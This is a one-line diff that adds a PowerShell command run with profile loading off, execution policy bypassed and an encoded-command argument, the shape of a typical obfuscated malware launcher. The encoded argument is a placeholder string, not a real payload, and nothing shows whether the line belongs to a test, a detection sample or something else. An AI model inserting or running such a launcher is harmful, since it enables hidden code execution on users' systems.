@@ -1,0 +1,1 @@
+powershell.exe -nop -exec bypass -e SQBENC0D3DC0MM4ND
